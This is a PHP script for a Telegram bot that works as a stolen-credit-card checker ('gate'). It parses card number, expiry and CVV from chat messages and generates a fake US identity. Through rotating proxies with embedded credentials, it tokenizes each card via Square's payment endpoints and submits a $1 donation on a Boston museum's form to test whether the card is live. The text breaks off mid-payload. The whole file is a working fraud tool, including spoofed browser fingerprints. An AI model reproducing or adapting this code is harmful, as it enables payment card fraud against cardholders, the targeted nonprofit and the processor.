<?php
//LINK DE GATE https://www.icaboston.org/node/8256
error_reporting(0);
ini_set('display_errors', 0);
include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";

if(strpos($message, '!su') === 0 or strpos($message, '/su') === 0 or strpos($message, '.su') === 0)
{
    $starttime = microtime(true);
    sendaction($chat_id, "typing");

    $antispam = antispamCheck($userId);
    addUser($userId);
    if($antispam != False){
        $delay = microtimeFormat($starttime);
        $result = urlencode("[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.");
        $su = reply_to($chat_id,$message_id,$keyboard,$result);
        $respon = json_decode($su, TRUE);
        $message_id_1 = $respon['result']['message_id'];
        return;
    }else{
        //==============MENSAJE DE BIENVENIDA=======================//
        // $time_end = microtime(true);
        // $duration = $time_end - $starttime;
        $lista = substr($message, 4);
        $delay = microtimeFormat($starttime);
        $result = urlencode("<b>••• 🟥ESPERE VALIDANDO...
••• 💳 CC ➜  $lista
••• ⌛Time ➜  $delay Segs
••• 👨🏻Checked by UserId➜  $userId
••• 🧑🏻‍💻Bot by ➜  @Z_tJKkeZQoZlcssuXjVjNerQ</b>");
        $su = reply_to($chat_id,$message_id,$keyboard,$result);
        $respon = json_decode($su, TRUE);
        $message_id_1 = $respon['result']['message_id'];
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
        // echo "TIME>".$delay;
        // echo "\nRESPONSE:".$su;
        // echo "\nMessage id ".$message_id_1;
        //=============================================================//
        //===================AREA DE GATE==============================//
        $flag = 'getFlags';
        // $lista = substr($message, 5);
        $lista = clean($lista);
        $check = strlen($lista);
        $chem = substr($lista, 0,1);
        $cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
        $mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
        $ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
        $cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
        $strlenn = strlen($cc);
        $strlen1 = strlen($mes);
        $ano1 = $ano;
        $list = preg_replace('/\s/', '|', $lista);
        $vaut = array(1,2,7,8,9,0);

        if (in_array($chem, $vaut)) { 
            reply_to($chat_id, $message_id,$keyboard,$validauth); exit();
        } 

        if (empty($lista)){
            reply_to($chat_id, $message_id,$keyboard,$validauth); exit();
        }elseif($check<15){
            reply_to($chat_id, $message_id,$keyboard,$validauth); exit();
        }elseif(strlen($strlenn != 16)){
            reply_to($chat_id, $message_id,$keyboard,$validauth); exit();
        }
        if(strlen($strlen1 > 2)) {
            $ano = $cvv; 
            $cvv = $mes;
            $mes = $ano1;
        }
        // sleep(1);
        $delay2 = microtimeFormat($starttime);
        $result2 = urlencode("<b>
••• 💳CC ->> <code>$cc|$mes|$ano|$cvv</code> 
••• 🔋PROCESS ->> □□□□□ 10%[🟨] 
••• ⌛TIME ->> $delay2 s 
••• 👨🏻CHECKING BY ->> <a href='tg://user?id='>@$userId</a> 
••• 🧑🏻‍💻BOT BY :- <code>@Z_tJKkeZQoZlcssuXjVjNerQ</code></b>");
        $su1 = reply_to2($chat_id,$message_id_1,$keyboard,$result2);
        // $su = reply_to2($chat_id,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@ANONBD</code></b>");
        $respon2 = json_decode($su1, TRUE);
        $message_id_2 = $respon2['result']['message_id'];

        // echo "\n\nTIME>".$delay2;
        // echo "\nRESPONSE:".$su1;
        // echo "\nMessage id ".$message_id_2;
        //=============================FAKE USER GENERATOR=============================//
        $get = file_get_contents('https://randomuser.me/api/1.2/?nat=US');
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $first = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        $state1 = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $zip = $matches1[1][0];
        preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
        $usrnme = $matches1[1][0];
        preg_match_all("(\"password\":\"(.*)\")siU", $get, $matches1);
        $pass = $matches1[1][0];
        preg_match_all("(\"salt\":\"(.*)\")siU", $get, $matches1);
        $salt = $matches1[1][0];
        $pwd = ''.$pass.''.$salt.'';
        preg_match_all("(\"nat\":\"(.*)\")siU", $get, $matches1);
        $con = $matches1[1][0];
        $numero1 = substr($phone, 1,3);
        $numero2 = substr($phone, 6,3);
        $numero3 = substr($phone, 10,4);
        $phone = $numero1.''.$numero2.''.$numero3;
        $serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
        $serv_rnd = $serve_arr[array_rand($serve_arr)];
        $email = str_replace("example.com", $serv_rnd, $email);
        // echo "NAME>".$first." ".$last."\n"."Direccion>".$street."\n"."Ciudad".$city."\n"."Estado".$state;
        //==================================================================================================//
        //==================[BIN LOOK-UP]======================//
        $ch = curl_init();
        $bin = substr($cc, 0,6);
        curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $bindata = curl_exec($ch);
        $binna = json_decode($bindata,true);
        $brand = $binna['scheme'];
        $country = $binna['country']['name'];
        $type = $binna['type'];
        $bank = $binna['bank']['name'];
        curl_close($ch);
        // ==================[BIN LOOK-UP-END]======================//
        ###CHECKER PART###  
                
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: lookup.binlist.net',
        'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '');
        $fim = curl_exec($ch);
        $bank = capture($fim, '"bank":{"name":"', '"');
        $cname = capture($fim, '"name":"', '"');
        $brand = capture($fim, '"brand":"', '"');
        $country = capture($fim, '"country":{"name":"', '"');
        $phone = capture($fim, '"phone":"', '"');
        $scheme = capture($fim, '"scheme":"', '"');
        $type = capture($fim, '"type":"', '"');
        $emoji = capture($fim, '"emoji":"', '"');
        $currency = capture($fim, '"currency":"', '"');
        $binlenth = strlen($bin);
        $schemename = ucfirst("$scheme");
        $typename = ucfirst("$type");
        curl_close($ch);
        
        switch ($mes) {
            case '01':
            $mes = '1';
              break;
            case '02':
            $mes = '2';
              break;
            case '03':
            $mes = '3';
              break;
            case '04':
            $mes = '4';
              break;
            case '05':
            $mes = '5';
              break;
            case '06':
            $mes = '6';
              break;
            case '07':
            $mes = '7';
              break;
            case '08':
            $mes = '8';
              break;
              case '09':
              $mes = '9';
              break;
          }
        /////////////////////==========[Unavailable if empty]==========////////////////
        //==============================ZONA DE PASO1 GATE=========================//
        ///////////////////////////////////////////////////=========[PROXY]
          //////////////////////////==============[Proxy Section]===============//////////////////////////////
          $Websharegay = rand(0,250);
          $rp1 = array(
            1 => 'djysglej-rotate:de1u4mj43pll',
            2 => 'djysglej-rotate:de1u4mj43pll',
          ); 
          $rotate = $rp1[array_rand($rp1)];

        $ch = curl_init('https://api.ipify.org/');
        curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_PROXY => 'http://p.webshare.io:80',
        CURLOPT_PROXYUSERPWD => $rotate,
        CURLOPT_HTTPGET => true,
        ]);
        $ip1 = curl_exec($ch);
        curl_close($ch);
        ob_flush();  
        if (isset($ip1)){
          $ip = "Live! ✅";
        }
        if (empty($ip1)){
          $ip = "Dead![".$rotate."] ❌";
        }
        echo '[ IP: '.$ip.' ] ';
        //=====================================================
        function rebootproxys()
        {
            $poxySocks = file("proxy.txt");
            $myproxy = rand(0, sizeof($poxySocks) - 1);
            $poxySocks = $poxySocks[$myproxy];
            return $poxySocks;
        }
        $poxySocks4 = rebootproxys();

        // $username = 'LYHBl6a1ssT'; 
        // $password = 'zc7l6f4Tn'; 
        
        $proxiss = explode(":", $poxySocks4);        

        ///////////////////////////////////////////////////=========[Authorizing Cards]
        $ch = curl_init();
        //================IMPLEMENTACION PARA NO RECURRIR A OBETNER SESSION ID Y NONCE DE LA SEGUNDA PETICION DE SQUAREUP ======//
        curl_setopt($ch, CURLOPT_URL, 'https://pci-connect.squareup.com/payments/hydrate?applicationId=sq0idp-6hj_oP1Z6MUXu_rUpVOYHg&hostname=www.icaboston.org&locationId=2THVNK18M7DJG&version=1.45.0');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        // curl_setopt($ch, CURLOPT_PROXY, $proxiss[0]);
        // curl_setopt($ch, CURLOPT_PROXYPORT, $proxiss[1]);
        // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
        // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        // curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        // curl_setopt($ch, CURLOPT_POST, 1);
        // curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        // curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        //     'accept: application/json',
        //     'method: GET',
        //     'scheme: https',
        //     'accept-encoding: gzip, deflate, br',
        //     'accept-Language: es-ES,es;q=0.7',
        //     'content-type: application/json; charset=UTF-8',
        //     'path: /payments/hydrate?applicationId=sq0idp-6hj_oP1Z6MUXu_rUpVOYHg&hostname=www.icaboston.org&locationId=2THVNK18M7DJG&version=1.45.0',
        //     'Host: pci-connect.squareup.com',
        //     'Origin: https://web.squarecdn.com',
        //     'referer: https://web.squarecdn.com/',
        //     'cookie: _savt=b054802f-7281-4527-922c-db0ad14b9531',
        //     'Sec-Fetch-Dest: empty',
        //     'Sec-Fetch-Mode: cors',
        //     'Sec-Fetch-Site: cross-site',
        //     'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36'
        //     ));            
        $resultass = curl_exec($ch);
        echo $resultass;
        $resultasss = json_decode($resultass, true);
        $sessionidd = $resultasss['sessionId']; 
        echo $sessionidd; 
        //======================================================================================================================//

        // $post = '{"client_id":"sq0idp-6hj_oP1Z6MUXu_rUpVOYHg","location_id":"2THVNK18M7DJG","payment_method_tracking_id":"27bfa240-5e87-76b2-cfb3-c859ba368f32","session_id":"ecBnmhLNqsjaOADjakE2UJC-NoI17rwU1aM0BqBLrLuM9HfTdoy2-UGvltRGLhxhQQ2UNQO2WEXg24roZ18k","website_url":"www.icaboston.org","squarejs_version":"ab1594abac","analytics_token":"FPBJ2XHFBQN2HEL3RGDVJI3SVY6CHLNWGKGE7DL2VOOPPSGMPZPJE23YFSRARBKSZHEK7SHGTGRZ3GZSOSZY2HD7GRYX7BUZ","card_data":{"number":"'.$cc.'","exp_month":'.$mes.',"exp_year":'.$ano.',"cvv":"'.$cvv.'","billing_postal_code":"'.$zip.'"}}';
        $post= '{"client_id":"sq0idp-6hj_oP1Z6MUXu_rUpVOYHg","location_id":"2THVNK18M7DJG","payment_method_tracking_id":"07d699ce-d6e6-95c3-e3e0-df5c26a23919","session_id":"'.$sessionidd.'","website_url":"www.icaboston.org","analytics_token":"33AIESEKRIS4X5JYJ2E6HTMZOVNK2YEWTRDV6TKPLAPB6EITRZ4K6HR6JRZ6SHJGHPDRXD5M4X3C65NY2534FUHIYVGLL5UP","card_data":{"billing_postal_code":"'.$zip.'","cvv":"'.$cvv.'","exp_month":'.$mes.',"exp_year":'.$ano.',"number":"'.$cc.'"}}';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://pci-connect.squareup.com/v2/card-nonce?_=1669410246822.0828&version=1.45.0');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        // curl_setopt($ch, CURLOPT_PROXY, $proxiss[0]);
        // curl_setopt($ch, CURLOPT_PROXYPORT, $proxiss[1]);
        // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
        // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'accept: application/json',
            'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8',
            'content-type: application/json; charset=UTF-8',
            'path: /v2/card-nonce?_=1669410246822.0828&version=1.45.0',
            'Host: pci-connect.squareup.com',
            'Origin: https://web.squarecdn.com',
            'square-version: 2018-07-12',
            'referer: https://web.squarecdn.com/',
            'cookie: _savt=d1c64e45-30d3-49b3-9d2d-1db97fb35223',
            'Sec-Fetch-Dest: empty',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Site: cross-site',
            'x-js-id: undefined',
            'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36'
            ));            
        $resulta = curl_exec($ch);
        echo $resulta;
        $resulta1 = json_decode($resulta, true);
        $cnon = $resulta1['card_nonce']; 
        echo $cnon; 


        $delay3 = microtimeFormat($starttime);
        $result3 = urlencode("<b>
••• 💳CC ->> <code>$cc|$mes|$ano|$cvv</code> 
••• 🔋PROCESS ->> □□□□□□□ 20%[🟨] 
••• ⌛TIME -> $delay3 s 
Proxy [ IP: $ip]
••• RESPONSE---> VALIDANdO TARJETA
••• 👨🏻CHECKING BY ->> <a href='tg://user?id='>@$userId</a> 
••• 🧑🏻‍💻BOT BY :- <code>@Z_tJKkeZQoZlcssuXjVjNerQ</code></b>");
        $su2 = reply_to2($chat_id,$message_id_2,$keyboard,$result3);
        $respon3 = json_decode($su2, TRUE);
        $message_id_3 = $respon3['result']['message_id'];

        // echo "\n\nTIME>".$delay3;
        // echo "\nRESPONSE:".$su2;
        // echo "\nMessage id ".$message_id_3;
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////
$post = '{"browser_fingerprint_by_version":[{"payload_json":"{\"components\":{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.0.0\",\"language\":\"es-ES\",\"color_depth\":24,\"resolution\":[1366,768],\"available_resolution\":[1366,720],\"timezone_offset\":360,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"1\",\"regular_plugins\":[],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Book Antiqua\",\"Bookman Old Style\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Century\",\"Century Gothic\",\"Century Schoolbook\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Garamond\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Bright\",\"Lucida Calligraphy\",\"Lucida Console\",\"Lucida Fax\",\"Lucida Handwriting\",\"Lucida Sans\",\"Lucida Sans Typewriter\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"Monotype Corsiva\",\"MS Gothic\",\"MS Outlook\",\"MS PGothic\",\"MS Reference Sans Serif\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"b8510eb8968bccd3314d0d58396760a9\"}","payload_type":"fingerprint-v1"},{"payload_json":"{\"components\":{\"language\":\"es-ES\",\"color_depth\":24,\"resolution\":[1366,768],\"available_resolution\":[1366,720],\"timezone_offset\":360,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"1\",\"regular_plugins\":[],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Book Antiqua\",\"Bookman Old Style\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Century\",\"Century Gothic\",\"Century Schoolbook\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Garamond\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Bright\",\"Lucida Calligraphy\",\"Lucida Console\",\"Lucida Fax\",\"Lucida Handwriting\",\"Lucida Sans\",\"Lucida Sans Typewriter\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"Monotype Corsiva\",\"MS Gothic\",\"MS Outlook\",\"MS PGothic\",\"MS Reference Sans Serif\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"18b6438a6c7d4743c4392abd9b972263\"}","payload_type":"fingerprint-v1-sans-ua"}],"browser_profile":{"components":"{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.0.0\",\"language\":\"es-ES\",\"color_depth\":24,\"resolution\":[1366,768],\"available_resolution\":[1366,720],\"timezone_offset\":360,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"1\",\"regular_plugins\":[],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Book Antiqua\",\"Bookman Old Style\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Century\",\"Century Gothic\",\"Century Schoolbook\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Garamond\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Bright\",\"Lucida Calligraphy\",\"Lucida Console\",\"Lucida Fax\",\"Lucida Handwriting\",\"Lucida Sans\",\"Lucida Sans Typewriter\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"Monotype Corsiva\",\"MS Gothic\",\"MS Outlook\",\"MS PGothic\",\"MS Reference Sans Serif\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]}","fingerprint":"b8510eb8968bccd3314d0d58396760a9","version":"e9a347c4e598d7b4ba217eaa000f6e332e570f08","website_url":"https://www.icaboston.org/"},"client_id":"sq0idp-6hj_oP1Z6MUXu_rUpVOYHg","payment_source":"'.$cnon.'","universal_token":{"token":"2THVNK18M7DJG","type":"UNIT"},"verification_details":{"billing_contact":{"email":"'.$email.'","family_name":"'.$last.'","given_name":"'.$first.'"},"intent":"CHARGE","total":{"amount":100,"currency":"USD"}}}';
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://connect.squareup.com/v2/analytics/verifications');
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    // curl_setopt($ch, CURLOPT_PROXY, $proxiss[0]);
    // curl_setopt($ch, CURLOPT_PROXYPORT, $proxiss[1]);
    // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
    // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authority: connect.squareup.com',
    'method: POST',
    'path: /v2/analytics/verifications',
    'scheme: https',
    'accept: */*',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/json',
    'cookie: _savt=d1c64e45-30d3-49b3-9d2d-1db97fb35223',
    'origin: https://connect.squareup.com',
    'referer: https://connect.squareup.com/payments/data/frame.html?referer=https://www.icaboston.org/node/8256',
    'sec-ch-ua-mobile: ?0',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36'
    ));
    $resultb = curl_exec($ch);
    $resultb1 = json_decode($resultb, true);
    $verf = $resultb1['token'];
    // $verf = trim(strip_tags(getStr2($resultb,'"token":"','"'))); 
    echo $verf;
    
    $delay4 = microtimeFormat($starttime);
    $result4 = urlencode("<b>
••• 💳CC ->> <code>$cc|$mes|$ano|$cvv</code> 
••• 🔋PROCESS ->> □□□□□□□ 50%[🟨] 
••• ⌛TIME -> $delay4 s 
••• RESPONSE---> CREANDO SOLICITUD
Proxy [ IP: $ip]
••• 👨🏻CHECKING BY ->> <a href='tg://user?id='>@$userId</a> 
••• 🧑🏻‍💻BOT BY :- <code>@Z_tJKkeZQoZlcssuXjVjNerQ</code></b>");
        $su3 = reply_to2($chat_id,$message_id_3,$keyboard,$result4);
        $respon4 = json_decode($su3, TRUE);
        $message_id_4 = $respon4['result']['message_id'];

        // echo "\n\nTIME>".$delay4;
        // echo "\nRESPONSE:".$su4;
        // echo "\nMessage id ".$message_id_4;

        $post2 = 'formID=82535405014145&q32_giftAmount=1&q32_giftAmount%5Bother%5D=1&q45_typeA=&q35_myGift=&q36_ifYoud36=&q37_giftMessage=&q4_name%5Bfirst%5D='.$first.'&q4_name%5Blast%5D='.$last.'&q40_nameAs='.$first.'+'.$last.'&q5_address%5Baddr_line1%5D='.$street.'&q5_address%5Baddr_line2%5D=&q5_address%5Bcity%5D='.$city.'&q5_address%5Bstate%5D='.$state.'&q5_address%5Bpostal%5D='.$zip.'&q6_email='.$email.'&q7_phoneNumber%5Bfull%5D=%28201%29+733-9213&q22_ordersum=1&q41_promo=&simple_fpc=23&payment_total_checksum=1&q23_giftTotal%5Bprice%5D=1&q23_giftTotal%5Bcc_firstName%5D='.$first.'&q23_giftTotal%5Bcc_lastName%5D='.$last.'&website=&simple_spc=82535405014145-82535405014145&embedUrl=https%3A%2F%2Fwww.icaboston.org%2Fnode%2F8256&event_id=1669283229189_82535405014145_htBczJG&nds-pmd=%7B%22jvqtrgQngn%22%3A%7B%22oq%22%3A%22725%3A1471%3A1366%3A720%3A1366%3A720%22%2C%22wfi%22%3A%22flap-153472%22%2C%22oc%22%3A%22700%22%2C%22fe%22%3A%221366k768+24%22%2C%22qvqgm%22%3A%22360%22%2C%22jxe%22%3A65727%2C%22syi%22%3A%22snyfr%22%2C%22si%22%3A%22si%2Cbtt%2Czc4%2Cjroz%22%2C%22sn%22%3A%22sn%2Czcrt%2Cbtt%2Cjni%22%2C%22us%22%3A%228o5654qpoo2p1s6%22%2C%22cy%22%3A%22Jva32%22%2C%22sg%22%3A%22%7B%5C%22zgc%5C%22%3A0%2C%5C%22gf%5C%22%3Asnyfr%2C%5C%22gr%5C%22%3Asnyfr%7D%22%2C%22sp%22%3A%22%7B%5C%22gp%5C%22%3Agehr%2C%5C%22ap%5C%22%3Agehr%7D%22%2C%22sf%22%3A%22gehr%22%2C%22jt%22%3A%22s2nno0055p58o750%22%2C%22sz%22%3A%22qq24746n55316rn4%22%2C%22vce%22%3A%22apvc%2C0%2C637s3q9s%2C2%2C1%3Bfg%2C0%2Cvachg_32%2C0%2Csvefg_4%2C0%2Cynfg_4%2C0%2Cvachg_40%2C0%2Cvachg_5_nqqe_yvar1%2C0%2Cvachg_5_nqqe_yvar2%2C0%2Cvachg_5_pvgl%2C0%2Cvachg_5_fgngr%2C0%2Cvachg_5_cbfgny%2C0%2Cvachg_6%2C0%2Cvachg_7_shyy%2C0%2Cvachg_23_qbangvba%2C0%2Cvachg_23_pp_svefgAnzr%2C0%2Cvachg_23_pp_ynfgAnzr%2C0%3Bzz%2C14qp%2C1on%2C12%2C%3Bzzf%2C3rp%2C0%2Cn%2C0+7o%2C5240+r88%2Cn46%2Cnn3%2C-29os8%2C-473%2C-5qq8%3Bzzf%2C3s3%2C3s3%2Cn%2C0+7p%2C3s2+3r8r%2Cnq6%2Cn05%2C-18o3p%2C2q075%2C983%3Bzp%2C105%2C2s%2C4q%2Cvachg_32_0%3Bzzf%2C2q5%2C3qn%2Cn%2C28p+183%2C20r3+qop%2C610%2C5rn%2C-14386%2C13p68%2C1431%3Bzzf%2C3r9%2C3r9%2Cn%2Con9+sq%2Cq7+5545%2C13s1%2C141s%2C-1408q%2C34404%2C22n6%3Bzz%2C127%2C34%2Cq0%2Cbgure_32%3Bzzf%2C2p1%2C3r8%2Cn%2Cr5+197%2C1917+1879%2Cnqn%2Cnn7%2C-15n12%2C10sn0%2C-1r19%3Bxx%2C1p3%2C0%2Cvachg_32%3Bss%2C0%2Cvachg_32%3Bzp%2C86%2C6n%2Cpr%2Cvachg_32%3Bxq%2C14r%2C0%3Bzzf%2C5r%2C3s5%2Cn%2C41+74%2Cp7r+8r3%2C264%2C26o%2C-4o25%2C-587%2C-1291%3Bxh%2C42%2C0%3Bzzf%2C398%2C3qn%2Cn%2C421+64o%2C2p8o+252o%2C75r%2C789%2C-2088n%2C1qsnr%2C-321%3Bzzf%2C3r8%2C3r8%2Cn%2CABC%3Bzzf%2C3r8%2C3r8%2Cn%2C4p4+n11%2C24ns+19o0%2C8o7%2C8o8%2C-q13n%2C1p460%2Co26%3Bzz%2C11s%2C58%2C10p%2Cynory_34%3Bzzf%2C2pn%2C3r9%2Cn%2C0+10s%2C1827+3652%2Cpnn%2Cpnn%2C-151on%2C13r9s%2C-nr8%3Bgf%2C0%2C3orr%3Bzz%2C1s49%2C239%2C215%2C%3Bso%2C303%2Cvachg_32%3Bxx%2C3%2C0%2Csvefg_4%3Bss%2C0%2Csvefg_4%3Bzp%2C7o%2C5p%2C1so%2Csvefg_4%3Bzzf%2C45o%2C2725%2C32%2C14q+p5%2C4608+so75%2Cnrp%2C6890%2C-4ro95%2C5696o%2C2os%3Bxq%2C92%2C0%3Bxh%2C0%2C0%3Bso%2C6%2Csvefg_4%3Bxx%2C1%2C0%2Cynfg_4%3Bss%2C0%2Cynfg_4%3Bxq%2C0%2C0%3Bxh%2C1%2C0%3Bso%2C1%2Cynfg_4%3Bxx%2C2%2C0%2Cvachg_40%3Bss%2C0%2Cvachg_40%3Bxq%2C0%2C0%3Bxh%2C0%2C0%3Bso%2C2%2Cvachg_40%3Bxx%2C2%2C0%2Cvachg_5_nqqe_yvar1%3Bss%2C0%2Cvachg_5_nqqe_yvar1%3Bxq%2C0%2C0%3Bxh%2C0%2C0%3Bso%2C4%2Cvachg_5_nqqe_yvar1%3Bxx%2C4%2C0%2Cvachg_5_nqqe_yvar2%3Bss%2C0%2Cvachg_5_nqqe_yvar2%3Bxq%2C0%2C0%3Bxh%2C0%2C0%3Bso%2C2%2Cvachg_5_nqqe_yvar2%3Bxx%2C3%2C0%2Cvachg_5_pvgl%3Bss%2C0%2Cvachg_5_pvgl%3Bxq%2C0%2C0%3Bxh%2C0%2C0%3Bso%2C2%2Cvachg_5_pvgl%3Bxx%2C2%2C0%2Cvachg_5_fgngr